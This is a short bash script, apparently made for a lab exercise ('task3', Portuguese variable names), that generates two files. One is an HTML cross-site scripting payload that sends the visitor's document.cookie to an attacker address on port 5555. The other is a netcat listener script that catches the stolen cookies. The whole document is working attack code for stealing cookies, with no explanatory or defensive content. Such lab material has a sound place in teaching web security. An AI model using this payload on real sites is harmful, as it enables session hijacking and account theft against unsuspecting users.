#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ATACANTE_IP="10.9.0.1"
PORTA="5555"

cat > "$SCRIPT_DIR/task3_cookie_theft.html" <<EOF
<script>
(function () {
  var pedido = new Image();
  pedido.src = "http://${ATACANTE_IP}:${PORTA}/?c=" + encodeURIComponent(document.cookie);
})();
</script>
EOF

cat > "$SCRIPT_DIR/listen_5555.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

nc -lnv 5555
EOF

chmod +x "$SCRIPT_DIR/listen_5555.sh"

printf 'Criados: task3_cookie_theft.html e listen_5555.sh\n'
